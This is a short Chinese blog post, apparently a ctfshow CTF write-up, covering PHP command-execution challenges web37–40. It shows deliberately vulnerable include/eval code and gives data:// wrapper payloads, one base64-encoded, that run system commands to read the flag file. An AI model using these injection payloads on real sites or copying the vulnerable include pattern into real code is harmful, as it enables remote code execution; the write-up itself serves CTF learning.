@@ -1,0 +1,94 @@
+---
+layout: post
+title:  "[命令执行]web37-39"
+date:   2020-01-10 23:00:00 +0800
+categories: ctfshow
+---
+
+### Web37
+
+```php
+error_reporting(0);
+if(isset($_GET['c'])){
+  $c = $_GET['c'];
+  if(!preg_match("/flag/i", $c)){
+    include($c);
+    echo $flag;
+
+  }
+    
+}else{
+  highlight_file(__FILE__);
+}
+```
+
+与前面的相比，这次直接换掉了`eval()`函数，变成了`include`
+
+用伪协议写入数据流，读取flag
+
+[参考文章](https://segmentfault.com/a/1190000018991087)
+
+```
+payload:?c=data://text/plain,<?php system("cat fla*")?>
+```
+
+### Web38
+
+```php
+error_reporting(0);
+if(isset($_GET['c'])){
+  $c = $_GET['c'];
+  if(!preg_match("/flag|php|file/i", $c)){
+    include($c);
+    echo $flag;
+
+  }
+    
+}else{
+  highlight_file(__FILE__);
+}
+```
+
+ban掉了`file`和`php`，直接用base64绕过去就行
+
+```
+payload:?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhKiIpPz4=
+```
+
+这里应该使用php的`base64_encode($str)`函数加密一下字符串，否则不匹配
+
+### Web39
+
+```php
+error_reporting(0);
+if(isset($_GET['c'])){
+  $c = $_GET['c'];
+  if(!preg_match("/flag/i", $c)){
+    include($c.".php");
+  }
+    
+}else{
+  highlight_file(__FILE__);
+}
+```
+
+增加了后缀的限制，回在最后传入的时候添加`.php`后缀，限制了传入，但是并不严谨，因为前面的语句已经执行完毕。
+
+`payload:?c=data://text/plain,<?php system("cat fla*")?>`
+
+### Web40
+
+```php
+if(isset($_GET['c'])){
+  $c = $_GET['c'];
+  if(!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\/i", $c)){
+    eval($c);
+  }
+    
+}else{
+  highlight_file(__FILE__);
+}
+```
+
+啊不行了，明天看师傅们的wp吧，鸽了
+
